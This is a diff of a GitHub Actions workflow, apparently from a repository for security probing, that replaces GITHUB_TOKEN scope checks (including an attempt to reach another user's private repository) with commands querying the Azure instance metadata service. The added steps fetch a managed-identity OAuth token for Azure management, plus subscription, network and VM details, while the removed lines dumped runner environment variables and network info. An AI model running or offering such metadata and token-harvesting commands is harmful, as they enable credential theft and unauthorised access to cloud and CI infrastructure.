@@ -1,4 +1,4 @@
-name: Security Test
+name: IMDS Test
 on: workflow_dispatch
 permissions:
   contents: read
@@ -6,32 +6,23 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Check GITHUB_TOKEN scopes
-        env:
-          GH_TOKEN: ${{ github.token }}
+      - name: Check Azure IMDS
         run: |
-          echo "=== Token info ==="
-          curl -sI "https://api.github.com/user" -H "Authorization: bearer $GH_TOKEN" | grep -i "x-oauth-scopes\|x-accepted-oauth-scopes\|x-ratelimit"
+          echo "=== Azure IMDS instance metadata ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq . 2>/dev/null || echo "no jq or no data"
           
           echo ""
-          echo "=== Can token access other repos? ==="
-          curl -s -o /dev/null -w "Own repo: %{http_code}\n" "https://api.github.com/repos/hackingmywayin/xss-test" -H "Authorization: bearer $GH_TOKEN"
-          curl -s -o /dev/null -w "Other public: %{http_code}\n" "https://api.github.com/repos/torvalds/linux" -H "Authorization: bearer $GH_TOKEN"
-          curl -s -o /dev/null -w "Private repo: %{http_code}\n" "https://api.github.com/repos/tryinganotherchance/private-secret-data" -H "Authorization: bearer $GH_TOKEN"
+          echo "=== Azure IMDS identity token ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | head -5
           
           echo ""
-          echo "=== Runner network info ==="
-          curl -s ifconfig.me
-          echo ""
+          echo "=== Azure IMDS scheduledevents ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>/dev/null | head -5
           
           echo ""
-          echo "=== Check internal metadata ==="
-          curl -s -o /dev/null -w "EC2 metadata: %{http_code}\n" --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" || echo "metadata not accessible"
+          echo "=== Network interfaces ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" | jq . 2>/dev/null | head -30
           
           echo ""
-          echo "=== Check Azure IMDS ==="
-          curl -s -o /dev/null -w "Azure IMDS: %{http_code}\n" --connect-timeout 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || echo "IMDS not accessible"
-          
-          echo ""
-          echo "=== Check runner environment ==="
-          env | grep -i "ACTIONS\|RUNNER\|GITHUB" | sort | head -30
+          echo "=== Compute info ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | jq "{vmId, name, resourceGroupName, subscriptionId, location, vmSize, offer, publisher, sku, version}" 2>/dev/null
